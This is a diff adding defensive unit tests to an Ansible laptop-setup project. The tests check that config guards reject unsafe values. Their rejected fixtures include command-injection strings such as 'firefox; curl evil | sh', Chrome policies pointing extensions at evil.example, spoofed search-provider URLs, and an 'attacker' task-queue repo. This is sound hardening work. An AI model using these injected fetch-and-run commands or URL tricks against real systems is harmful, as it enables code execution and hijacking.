@@ -549,6 +549,138 @@ class InputGuardTests(unittest.TestCase):
                 self.check(tasks, {'system_is_container': container, 'ansible_facts': {'services': services}}, True)
 
 
+class UserLevelGuardTests(unittest.TestCase):
+    """config.yml values that become commands run as the user, Chrome policy written as root, the queue's repo and
+    authors, and vm.mmap_min_addr: refused at the point of use (scripts/parse-config.py --policy checks the same)."""
+    HOME = '/home/fixture'
+    check = InputGuardTests.check
+
+    def test_linux_browser_and_terminal_are_known_commands(self):
+        task = guard('roles/desktop/tasks/main.yml', 'Assert the browser and terminal are known commands (Linux)')
+        base = {'is_linux': True, 'desktop_wm_browser': 'firefox', 'desktop_terminal': 'alacritty'}
+        for key, value, accepted in [
+                ('desktop_wm_browser', 'google-chrome', True), ('desktop_terminal', 'foot', True),
+                ('desktop_wm_browser', '/usr/bin/firefox', False), ('desktop_terminal', '/usr/libexec/foot', False),
+                ('desktop_terminal', 'bash', False), ('desktop_terminal', 'sh', False), ('desktop_wm_browser', 'sudo', False),
+                ('desktop_wm_browser', 'env', False), ('desktop_wm_browser', ['firefox'], False),
+                ('desktop_wm_browser', 'firefox; curl evil | sh', False), ('desktop_terminal', 'alacritty -e sh -c evil', False)]:
+            with self.subTest(key=key, value=value):
+                self.check(task, dict(base, **{key: value}), accepted)
+
+    def test_vpn_status_command_is_a_read_only_status_shape(self):
+        task = guard('roles/desktop/tasks/main.yml', 'Validate desktop_i3status_vpns')
+        for command, accepted in [(c, True) for c in [['mullvad', 'status'], ['tailscale', 'status', '--json', '--peers=false'], ['netbird', 'status', '-d'], ['wg', 'show', 'wg0'], ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show', '--active'], ['warp-cli', 'status'], ['openvpn3', 'sessions-list']]] + [(c, False) for c in [['sh', '-c', 'curl evil | sh'], ['/usr/bin/bash', '-c', 'setsid evil'], ['/tmp/x'], ['env', 'tailscale', 'status'], ['tailscale', 'up'], ['tailscale', 'status', '--web'], ['nmcli', 'connection', 'delete', 'x'], ['nmcli', 'radio', 'wifi', 'off', 'connection', 'show', '--active'], ['wg', 'show', 'x', 'y'], ['/usr/bin/wg', 'show'], ['mullvad', 'status', 'listen'], ['wg', 'show', 'a b']]]:
+            with self.subTest(command=command):
+                self.check(task, {'desktop_i3status_vpn': True, 'desktop_environment': 'sway', 'is_macos': False,
+                                  'desktop_macos_bar': False,
+                                  'desktop_i3status_vpns': [{'name': 'VPN', 'command': command, 'connected': '^up'}]},
+                           accepted)
+
+    def chrome(self, policies, accepted):
+        task = guard('roles/desktop/tasks/chrome.yml', 'Check the declared Chrome settings')
+        self.check(task, {'_chrome_extensions': [], '_chrome_policies': {}, '_chrome_policies_enforced': policies,
+                          'role_path': str(ROOT / 'roles/desktop'),
+                          'desktop_chrome_page_zoom': '', 'desktop_chrome_color_scheme': 'dark'}, accepted)
+
+    def test_chrome_policy_names_and_tracked_extensions(self):
+        for policies, accepted in [(p, True) for p in [{'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh']}, {'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh;https://clients2.google.com/service/update2/crx']}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'installation_mode': 'force_installed', 'toolbar_pin': 'force_pinned'}, '*': {'installation_mode': 'blocked', 'blocked_permissions': ['debugger']}}}, {'ExtensionInstallAllowlist': ['ddkjiahejlhfcafbddmgiahcphecmpfh']}, {'ExtensionInstallBlocklist': ['*', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'BookmarkBarEnabled': True}]] + [(p, False) for p in [{'ExtensionInstallForcelist': ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh;https://evil.example/u.xml']}, {'ExtensionSettings': {'*': {'installation_mode': 'allowed', 'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'*': {'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'*': {'installation_mode': 'force_installed'}}}, {'ExtensionSettings': {'*': {'allowed_types': ['extension']}}}, {'ExtensionSettings': {'*': {'install_sources': ['https://evil.example/*']}}}, {'ExtensionSettings': {'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa': {'installation_mode': 'force_installed'}}}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'update_url': 'https://evil.example/u.xml'}}}, {'ExtensionInstallAllowlist': ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'ExtensionInstallAllowlist': ['*']}, {'URLAllowlist': ['*']}]]:
+            with self.subTest(policies=policies):
+                self.chrome(policies, accepted)
+
+    def test_external_extensions_only_from_the_tracked_allowlist(self):
+        task = guard('roles/desktop/tasks/chrome.yml', 'Check the declared Chrome settings')
+        base = {'_chrome_policies': {}, '_chrome_policies_enforced': {}, 'desktop_chrome_page_zoom': '',
+                'desktop_chrome_color_scheme': 'dark', 'role_path': str(ROOT / 'roles/desktop')}
+        for extensions, accepted in [([{'id': 'nngceckbapebfimnlniiiahkandclblb'}], True),
+                                     ([{'id': 'ddkjiahejlhfcafbddmgiahcphecmpfh', 'install': False}], True),
+                                     ([{'id': 'a' * 32}], False),
+                                     ([{'id': 'nngceckbapebfimnlniiiahkandclblb'}, {'id': 'b' * 32, 'install': False}], False)]:
+            with self.subTest(extensions=extensions):
+                self.check(task, dict(base, _chrome_extensions=extensions), accepted)
+
+    def test_search_provider_urls_are_exact_tracked_urls(self):
+        for (name, value), accepted in [(u, True) for u in [('DefaultSearchProviderSearchURL', 'https://www.google.com/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://duckduckgo.com/?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search?{google:RLZ}q={searchTerms}'), ('DefaultSearchProviderAlternateURLs', ['https://www.bing.com/search?q={searchTerms}']), ('DefaultSearchProviderSuggestURL', 'https://www.google.com/complete/search?client=chrome&q={searchTerms}'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/')]] + [(u, False) for u in [('DefaultSearchProviderSearchURL', 'https://script.google.com/macros/s/ATTACKER/exec?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://sites.google.com/view/x?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/url?q=https://evil.example/'), ('DefaultSearchProviderSearchURL', 'https://google.com/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com:443/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search/../url?q=x'), ('DefaultSearchProviderSearchURL', 'https://evil.example\\@www.google.com/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://www.google.com\\.evil.example/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://user@www.google.com/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search#@evil.example'), ('DefaultSearchProviderSearchURL', 'http://www.google.com/search'), ('DefaultSearchProviderSearchURL', ' https://www.google.com/search'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/complete/search?q=x'), ('DefaultSearchProviderAlternateURLs', ['https://www.google.com/search', 'https://evil.example/s']), ('DefaultSearchProviderSuggestURL', 'https://www.google.com/search?q=x'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/?evil=1'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/url?q=https://evil.example/'), ('DefaultSearchProviderImageURL', 'https://www.google.com/searchbyimage')]]:
+            with self.subTest(name=name, value=value):
+                self.chrome({name: value}, accepted)
+
+    def test_claude_config_dirs_inside_home_outside_the_repo(self):
+        task = guard('roles/claude/tasks/main.yml', 'SECURITY assert Claude config dirs are ~/.claude')
+        base = {'ansible_facts': {'user_dir': self.HOME}, 'common_project_root': self.HOME + '/laptop-setup',
+                'claude_queue_config_dir': self.HOME + '/.claude', 'claude_runtime_config_dir': self.HOME + '/.config/claude'}
+        for path, accepted in [(self.HOME + '/.claude-work', True), (self.HOME + '/.config/claude', True),
+                               (self.HOME + '/code/x/.claude', False), (self.HOME + '/../other/.claude', False),
+                               (self.HOME + '/./.claude', False), (self.HOME + '//.claude', False),
+                               (self.HOME + '/laptop-setup/toolbox/.claude', False), (self.HOME + '/laptop-setup', False),
+                               (self.HOME, False), ('/tmp/.claude', False)]:
+            with self.subTest(path=path):
+                self.check(task, dict(base, _claude_instances=[path]), accepted)
+
+    def test_queue_repo_and_authors_are_the_owner_or_tracked(self):
+        task = guard('roles/claude/tasks/main.yml', 'SECURITY assert the queue polls the owner')
+        base = {'claude_queue_enabled': True, 'dotfiles_github_user': 'attacker', 'role_path': str(ROOT / 'roles/claude'),
+                'claude_queue_repo': 'dfarrell07/tasks', 'claude_queue_allowed_authors': ['dfarrell07']}
+        for change, accepted in [({}, True), ({'claude_queue_repo': 'attacker/tasks'}, False),
+                                 ({'claude_queue_allowed_authors': ['dfarrell07', 'attacker']}, False),
+                                 ({'claude_queue_repo': 'dfarrell07/tasks;rm'}, False),
+                                 ({'claude_queue_repo': 'dfarrell07/.'}, False), ({'claude_queue_repo': 'dfarrell07/..'}, False)]:
+            with self.subTest(change=change):
+                self.check(task, dict(base, **change), accepted)
+
+    def test_claude_config_dirs_outside_git_work_trees_once_resolved(self):
+        tasks = yaml.safe_load((ROOT / 'roles/claude/tasks/main.yml').read_text())
+        [task] = [t for t in tasks if t.get('name', '').startswith('SECURITY check Claude config dirs resolve')]
+        with tempfile.TemporaryDirectory() as directory:
+            home = Path(directory)
+            (home / 'repo/.git').mkdir(parents=True)
+            (home / 'repo/.claude').mkdir()
+            (home / '.claude').mkdir()
+            (home / '.claude-x').symlink_to(home / 'repo/.claude')  # the allowed shape, resolving into a work tree
+            base = {'ansible_facts': {'user_dir': str(home)}, 'common_project_root': str(home / 'laptop-setup'),
+                    'claude_queue_config_dir': str(home / '.claude'), 'claude_runtime_config_dir': str(home / '.claude')}
+            for instance, accepted in [(home / '.claude', True), (home / '.claude-x', False)]:
+                with self.subTest(instance=instance.name):
+                    self.check([task], dict(base, _claude_instances=[str(instance)]), accepted)
+            (home / '.git').write_text('gitdir: /elsewhere\n')  # $HOME itself a work tree (a dotfiles checkout)
+            self.check([task], dict(base, _claude_instances=[str(home / '.claude')]), False)
+
+    def test_vpn_shape_matches_the_policy(self):
+        import importlib.util
+        import re
+        spec = importlib.util.spec_from_file_location('parse_config', ROOT / 'scripts/parse-config.py')
+        parser = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(parser)
+        task = guard('roles/desktop/tasks/main.yml', 'Validate desktop_i3status_vpns')
+        [item] = [t for t in task['ansible.builtin.assert']['that'] if "map('join', ' ')" in t]
+        pieces = re.findall(r"'([^']*)'", item)
+        shape = ''.join(pieces[pieces.index('^(') + 1:pieces.index(')\\Z')])
+        self.assertEqual(shape, parser.VPN_STATUS_SHAPE.pattern)
+
+    def test_sysctl_keys_are_strict_before_normalization(self):
+        task = guard('roles/system/tasks/main.yml', 'Validate sysctl key and value format')
+        base = {'system_is_container': False, 'csb_rhel': False, 'system_sysctl_extra_additional': {}}
+        self.check(task, dict(base, system_sysctl_extra={'vm.mmap_min_addr': 65536, 'kernel.kptr_restrict': 2}), True)
+        for name in ['vm.mmap_min_addr!', ' vm.mmap_min_addr', 'vm.mmap_min_addr ', 'vm.mmap_min_addé', 'vm.mmap_min_addr\u200b', 'kernel.kptr_restrict ', 'kernel.kptr_restrict!', 'Vm.mmap_min_addr', 'vm..mmap_min_addr', 'vm/mmap_min_addr']:
+            with self.subTest(name=name):
+                self.check(task, dict(base, system_sysctl_extra={name: 0}), False)
+
+    def test_sysctl_template_fails_on_a_key_it_would_have_stripped(self):
+        template = str(ROOT / 'roles/system/templates/sysctl-hardening.conf.j2')
+        for name, accepted in [('vm.mmap_min_addr', True), ('-vm.swappiness', True)] + [(n, False) for n in ['vm.mmap_min_addr!', ' vm.mmap_min_addr', 'vm.mmap_min_addr ', 'vm.mmap_min_addé', 'vm.mmap_min_addr\u200b', 'kernel.kptr_restrict ', 'kernel.kptr_restrict!', 'Vm.mmap_min_addr', 'vm..mmap_min_addr', 'vm/mmap_min_addr']]:
+            with self.subTest(name=name):
+                task = {'ansible.builtin.debug': {'msg': "{{ lookup('ansible.builtin.template', '%s') }}" % template}}
+                self.check(task, {'system_sysctl_hardening': {'kernel.kptr_restrict': 2, name: 4096}}, accepted)
+
+    def test_mmap_min_addr_floor(self):
+        task = guard('roles/system/tasks/main.yml', 'Refuse vm.mmap_min_addr below 4096')
+        base = {'system_is_container': False, 'csb_rhel': False, 'system_sysctl_extra_additional': {}}
+        for extra, accepted in [({'vm.swappiness': 10}, True), ({'vm.mmap_min_addr': 65536}, True),
+                                ({'vm.mmap_min_addr': 0}, False), ({'-vm/mmap_min_addr': '0'}, False),
+                                ({'vm..mmap_min_addr': 4095}, False), ({'vm.mmap_min_addr': 'x'}, False),
+                                ({'--vm.mmap_min_addr': 0}, False)]:
+            with self.subTest(extra=extra):
+                self.check(task, dict(base, system_sysctl_extra=extra), accepted)
+
+
 class WrapperBashTests(unittest.TestCase):
     """verify-ansible-args.sh sets IFS=$'\\n\\t'; under bash 3.2 "${arr[@]:N}" then joins into one word."""
 
